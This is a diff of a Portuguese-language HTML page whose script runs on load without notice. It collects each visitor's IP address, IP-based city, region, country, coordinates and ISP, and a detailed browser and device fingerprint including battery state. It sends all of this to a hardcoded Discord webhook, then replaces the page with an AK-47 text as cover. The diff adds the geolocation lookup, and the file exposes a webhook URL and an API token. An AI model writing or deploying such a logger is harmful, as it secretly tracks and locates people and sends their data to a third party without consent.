@@ -8,9 +8,9 @@
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi";
+    const ipinfoToken = "e21650a9d682be";
 
     function getBrowserVersion(ua) {
-
       let match = ua.match(/(Edg|Chrome|Firefox|Safari)\/([\d\.]+)/);
       if (match) {
         let name = match[1];
@@ -19,11 +19,25 @@
       }
       return "Desconhecido";
     }
+    
+    function sendPayload(payload) {
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(payload)
+      });
+    }
+    
+    async function coletarEEnviarDados() {
+      try {
+        
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
 
-    fetch("https://api.ipify.org?format=json")
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
+        const ipinfoResponse = await fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`);
+        const ipinfoData = await ipinfoResponse.json();
+
         const userAgent = navigator.userAgent;
         const language = navigator.language;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -39,38 +53,20 @@
         const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
         const browserVersion = getBrowserVersion(userAgent);
 
-        if (navigator.getBattery) {
-          navigator.getBattery().then(battery => {
-            const batteryLevel = Math.round(battery.level * 100) + "%";
-            const charging = battery.charging ? "Sim" : "Não";
-
-            sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
-              hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
-              browserVersion, batteryLevel, charging);
-          }).catch(() => {
-            
-            sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
-              hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
-              browserVersion, "N/A", "N/A");
-          });
-        } else {
-          
-          sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
-            hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
-            browserVersion, "N/A", "N/A");
-        }
-
-        function sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
-          hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
-          browserVersion, batteryLevel, charging) {
-
+        function enviarComBateria(batteryLevel, charging) {
           const payload = {
             content: `🕵️ Novo visitante:
 - IP: ${ip}
+- Cidade: ${ipinfoData.city || "N/A"}
+- Região: ${ipinfoData.region || "N/A"}
+- País: ${ipinfoData.country || "N/A"}
+- Localização (lat,long): ${ipinfoData.loc || "N/A"}
+- Organização: ${ipinfoData.org || "N/A"}
+- Timezone (IPinfo): ${ipinfoData.timezone || "N/A"}
 - Navegador (userAgent): ${userAgent}
 - Versão do navegador: ${browserVersion}
 - Idioma: ${language}
-- Fuso horário: ${timezone}
+- Fuso horário (navegador): ${timezone}
 - Resolução da tela: ${screenResolution}
 - DPI (devicePixelRatio): ${devicePixelRatio}
 - Plugins: ${plugins}
@@ -83,12 +79,7 @@
 - Nível da bateria: ${batteryLevel}
 - Carregando bateria: ${charging}`
           };
-
-          fetch(webhookURL, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify(payload)
-          });
+          sendPayload(payload);
 
           document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
 
@@ -98,15 +89,30 @@ A principal característica da AK-47 é sua durabilidade. Ela pode continuar fun
 
 Com mais de 100 milhões de unidades produzidas (contando variantes licenciadas e não licenciadas), a AK-47 é considerada a arma de fogo mais produzida da história. Seu design também deu origem a várias versões, como a AKM, AK-74 e muitas outras adaptações fabricadas em diferentes países.
 
-Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global.
+Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat Gpt
 
 </h2>`;
         }
-      })
-      .catch(error => {
-        console.error("Erro ao obter informações:", error);
+
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            const batteryLevel = Math.round(battery.level * 100) + "%";
+            const charging = battery.charging ? "Sim" : "Não";
+            enviarComBateria(batteryLevel, charging);
+          }).catch(() => {
+            enviarComBateria("N/A", "N/A");
+          });
+        } else {
+          enviarComBateria("N/A", "N/A");
+        }
+
+      } catch (error) {
+        console.error("Erro ao obter ou enviar informações:", error);
         document.body.innerHTML = "<h2>Erro ao verificar.</h2>";
-      });
+      }
+    }
+
+    coletarEEnviarDados();
   </script>
 </body>
 </html>
